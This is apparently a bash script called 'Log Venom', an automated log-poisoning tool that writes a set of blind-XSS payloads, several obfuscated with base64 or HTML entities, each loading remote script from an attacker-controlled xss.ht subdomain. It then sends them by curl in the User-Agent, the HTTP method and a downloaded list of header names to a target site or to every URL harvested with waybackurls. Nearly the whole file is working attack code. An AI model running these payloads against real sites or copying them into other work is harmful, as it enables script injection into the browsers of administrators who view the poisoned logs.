#/usr/bin/bash

echo "Log Venom -- The automatic log poisoner"
echo "          by @shriyanss"
echo " https://github.com/shriyanss/logVenom"
echo ""

if [ "$1" == "" ]; then
    echo "Usage: ./logVeonom.sh <template_path>"
    echo "Use help for help"
    exit
elif [ "$1" == "help" ]; then
    echo "Template Options:-"
    echo ""
    echo "url: <target_URL>"
    echo "The target URL. Must be like http://target.com"
    echo ""
    echo "attacks: <xss>"
    echo "Attacks to perform. The one available is now XSS. SQLi and OS Command Injection coming soon. You can suggest more by creating a new pull request or issue at the github page."
    echo ""
    echo "xssht: <xss_hunter_username>"
    echo "Your XSS Hunter Username. This will be used in XSS payloads so that XSS Hunter would notify you on payload fire"
    echo ""
    echo "wayback: <true/false>"
    echo "Use waybackurls to fetch all URLs and perform attacks on them"
    echo ""
    echo "The template file must contain a whitespace in the end"
    exit
fi

while IFS= read -r line; do
    if [[ "${line}" == "url:"* ]]; then
        TARGET1=${line/"url: "/""}
        TARGET=${TARGET1/"url:"/""}
        httpScheme="http://"
        httpsScheme="https://"
        if [[ "${TARGET}" == "${httpScheme}"* ]]; then
            SSL="false"
            echo "[i] SSL set to false"
        elif [[ "${TARGET}" == "${httpsScheme}"* ]]; then
            SSL="true"
            echo "[i] SSL set to true"
        else
            echo "[!] Invalid target URL. It should be like https://www.target.com"
            exit
        fi
        echo "[i] Target set to $TARGET"
    elif [[ "${line}" == "attacks:"* ]]; then
        if [[ "${line}" == *"xss" ]]; then
            ATTACKS="XSS"
        elif [[ "${line}" == *"sqli" ]]; then
            echo "This feature is coming soon :)"
            exit
            ATTACKS="SQLi"
        elif [[ "${line}" == *"os-cmd-inj" ]]; then
            echo "This feature is coming soon :)"
            exit
            ATTACKS="OS-CMD-INJ"
        elif [[ "${line}" == *"all" ]]; then
            echo "This feature is coming soon :)"
            exit
            ATTACKS="ALL"
        else
            echo "[!] Invalid attack!"
            exit
        fi
    elif [[ "${line}" == "xssht:"* ]]; then
        XSSHT=${line/"xssht: "/""}
        XSSHT=${XSSHT/"xssht:"/""}
        echo "[i] XSS hunter username set to \"$XSSHT\". Will use that in XSS payloads"
    elif [[ "${line}" == "wayback:"* ]]; then
        if [[ "${line}" == *"true"* ]]; then
            WAYBACK="true"
        else
            WAYBACK="false"
        fi
    elif [[ "${line}" == "poison:"* ]]; then
        if [[ "${line}" == *"low"* ]]; then
            POISON="low"
        elif [[ "${line}" == *"medium"* ]]; then
            POISON="medium"
        elif [[ "${line}" == *"high"* ]]; then
            POISON="high"
        fi
        
    fi
done <$1

HOST1=${TARGET/"https://"/""}
HOST2=${HOST1/"http://"/""}
HOST=${HOST2/"/"*/""}

if [ "$ATTACKS" == "" ]; then
    ATTACKS="XSS"
fi

if [ "$ATTACKS" == "XSS" ]; then
    if [ "$XSSHT" == "" ]; then
        echo "[!] XSS Hunter username not set. XSS in log poisoning is blind XSS, so use it for detection"
        exit
    fi
elif [ "$ATTACKS" == "ALL" ]; then
    if [ "$XSSHT" == "" ]; then
        echo "[!] XSS Hunter username not set. XSS in log poisoning is blind XSS, so use it for detection"
        exit
    fi
fi

if [ "$POISON" == "" ]; then
    POISON="medium"
fi
if [ "$WAYBACK" == "" ]; then
    wayback="false"
fi

if [ "$WAYBACK" == "true" ]; then
    waybackurls $HOST > waybackurls.txt
fi

echo "[i] Wayback set to $WAYBACK"

# Write payloads to a file
echo "[i] Writing payloads to file"
echo "\"><script src=https://$XSSHT.xss.ht></script>" > xssPayloadLogVenom.txt
echo "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://$XSSHT.xss.ht\';document.body.appendChild(a)')" >> xssPayloadLogVenom.txt
pld="var a=document.createElement(\"script\");a.src=\"https://$XSSHT.xss.ht\";document.body.appendChild(a);"
base64Encoded=$(echo -n "$pld" | base64)
base64Encoded=${base64Encoded/"
"/""}
base64Encoded=${base64Encoded/"="/"&#61;"}
echo "\"><input onfocus=eval(atob(this.id)) id=$base64Encoded; autofocus>" >> xssPayloadLogVenom.txt
echo "\"><img src=x id=$base64Encoded; onerror=eval(atob(this.id))>" >> xssPayloadLogVenom.txt
echo "\"><video><source onerror=eval(atob(this.id)) id=$base64Encoded;>" >> xssPayloadLogVenom.txt
echo "\"><iframe srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;$XSSHT.xss.ht&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\">" >> xssPayloadLogVenom.txt
echo "<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//$XSSHT.xss.ht\");a.send();</script>" >> xssPayloadLogVenom.txt
echo "<script>$.getScript(\"//$XSSHT.xss.ht\")</script>" >> xssPayloadLogVenom.txt


# Perform attacks
if [ "$ATTACKS" == "XSS" ]; then
    if [ "$WAYBACK" == "true" ]; then
        while IFS= read -r line; do
            while IFS= read -r ln; do
                if [ "$POISON" == "low" ]; then
                    echo "[*] Poisoning with XSS at $line with low poison"
                    z=$(curl -s -H "User-Agent: $ln" $line)
                    y=$(curl -s -H "User-Agent: $ln" -X "POST" $line)
                elif [ "$POISON" == "medium" ]; then
                    echo "[*] Poisoning XSS at $line with medium poison"
                    z=$(curl -s -H "User-Agent: $ln" -X "GET" $line)
                    y=$(curl -s -H "User-Agent: $ln" -X "POST" $line)
                    e=$(curl -s -H "User-Agent: $ln" -X "$ln" $line)
                    f=$(curl -s -H "User-Agent: Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36" -X "$ln" $line)
                    g=$(curl -s -H "User-Agent: $ln" -X "$ln" $line)
                elif [ "$POISON" == "high" ]; then
                    echo "[*] Poisoning XSS at $line with high poison"
                    z=$(curl -s -H "User-Agent: $ln" $line)
                    e=$(curl -s -H "User-Agent: $ln" -X "$ln" $line)
                    f=$(curl -s -H "User-Agent: Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36" -X "$ln" $line)
                    g=$(curl -s -H "User-Agent: $ln" -X "$ln" $line)
                    x=$(curl -s -o headers.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/http-request-headers/http-request-headers-common-standard-fields.txt)
                    while IFS= read -r headerName; do
                        h=$(curl -s -H "$headerName: $ln" $line)
                    done < headers.txt
                fi
            done < xssPayloadLogVenom.txt
        done < waybackurls.txt
    else
        while IFS= read -r line; do
            if [ "$POISON" == "low" ]; then
                echo "[*] Poisoning XSS at $TARGET with low poison"
                z=$(curl -s -H "User-Agent: $line" -X "GET" $TARGET)
                y=$(curl -s -H "User-Agent: $line" -X "POST" $TARGET)
            elif [ "$POISON" == "medium" ]; then
                echo "[*] Poisoning XSS at $TARGET with medium poison"
                z=$(curl -s -H "User-Agent: $line" -X "GET" $TARGET)
                y=$(curl -s -H "User-Agent: $line" -X "POST" $TARGET)
                e=$(curl -s -H "User-Agent: $line" -X "$line" $TARGET)
                f=$(curl -s -H "User-Agent: Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36" -X "$line" $TARGET)
                g=$(curl -s -H "User-Agent: $line" -X "$line" $TARGET)
            elif [ "$POISON" == "high" ]; then
                echo "[*] Poisoning XSS at $TARGET with high poison"
                z=$(curl -s -H "User-Agent: $line" $TARGET)
                e=$(curl -s -H "User-Agent: $line" -X "$line" $TARGET)
                f=$(curl -s -H "User-Agent: Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36" -X "$line" $TARGET)
                g=$(curl -s -H "User-Agent: $line" -X "$line" $TARGET)
                x=$(curl -s -o headers.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/http-request-headers/http-request-headers-common-standard-fields.txt)
                while IFS= read -r headerName; do
                    h=$(curl -s -H "$headerName: $line" $TARGET)
                done < headers.txt
            fi
        done < xssPayloadLogVenom.txt
    fi
elif [ "$ATTACKS" == "SQLi" ]; then
    echo "[i] Attack is set to SQLi"
elif [ "$ATTACKS" == "OS-CMD-INJ" ]; then
    echo "[i] Attack is set to OS Command Injection"
elif [ "$ATTACKS" == "ALL" ]; then
    echo "[i] Gonna perform XSS, SQLi, and OS Command Injection through log poisoning"
fi
